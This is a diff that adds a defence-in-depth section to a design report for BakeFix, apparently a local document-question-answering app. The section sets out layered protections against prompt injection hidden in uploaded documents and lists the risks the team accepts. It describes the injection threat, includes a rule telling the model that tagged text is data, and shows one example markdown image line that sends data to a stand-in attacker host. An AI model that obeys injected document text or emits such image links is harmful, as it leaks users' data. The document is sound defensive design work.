@@ -186,6 +186,45 @@ rejected. To be rewritten in my own words for the report.
   developers: "Document already exists"); a retry button on every error (it
   only appears where retrying can help).
 
+## Defence in depth: the layers and what each stops
+
+The threat we design for: a document (uploaded, or a trusted one that was
+edited) contains instructions aimed at the model. Each layer assumes the one
+before it can fail.
+
+| Layer | What it does | What gets past it |
+|---|---|---|
+| 1. Upload checks | `.md`/`.txt` only, safe file name, UTF-8, ≤ 1 MB, not empty | Nothing about the content |
+| 2. Injection scanner + quarantine (Person A) | Suspicious uploads are held outside the corpus until a person approves them | Rephrased attacks the rules don't know |
+| 3. Prompt framing | Each chunk is inside `<chunk id=…>…</chunk>`, the question inside `<question>`; fake tags in documents, file names, or the question are made inert (`&lt;chunk`). The prompt says text inside the tags is data, never instructions | A model that follows the injection anyway |
+| 4. Output validation (Person B) | JSON schema; every cited chunk must have been retrieved; glossary entries must be cited; otherwise the answer is not shown | An answer that cites real chunks but says what the attacker wants |
+| 5. Safe rendering | Raw HTML dropped; **images never load**; links are shown as text with their address, not clickable | — (the browser sends nothing on its own) |
+| 6. Request limits | Question ≤ 2,000 characters; ≤ 4,096 output tokens; 30 s timeout with one retry | — |
+| 7. Cross-site check | Uploads, deletions, settings, quarantine decisions, and questions sent by another website's page are refused (403) before anything runs | Requests from a local program (no browser), which is outside this threat |
+
+- **Why images matter most:** layer 5 is the only one that does not depend on
+  the model behaving. A rendered `![](https://attacker/?q=<data>)` would send
+  data the moment the answer appears, without a click.
+- **Why the cross-site check:** the backend listens on `127.0.0.1`, but the
+  user's own browser can reach it from any website they visit. Without this,
+  a page could post a form that adds a document to their library.
+
+### Risks we accept (and why)
+- **No login.** BakeFix is a single-user app on the user's machine; the
+  backend listens on `127.0.0.1` only. Exposing it on a network would need
+  authentication first.
+- **The scanner is rule-based.** It misses rephrased attacks and flags some
+  harmless documents (Person A measured both). Layers 3 to 5 exist for what it
+  misses; the user decides on what it flags.
+- **Document text goes to Google.** Retrieved passages are sent to Gemini to
+  write the answer; emails and phone numbers are removed first (Person B), but
+  other personal data in a document is not. Users should not upload documents
+  they would not share with Google.
+- **Traces are readable by anyone with access to the machine** (no
+  authentication on `/api/traces`). They contain no document text or
+  questions, and expire after 30 days.
+- **The bundled corpora are trusted** and are not scanned; only uploads are.
+
 ## Open points to resolve with the team
 
 - Person B: record the answer style in the `llm_generation` span; consider
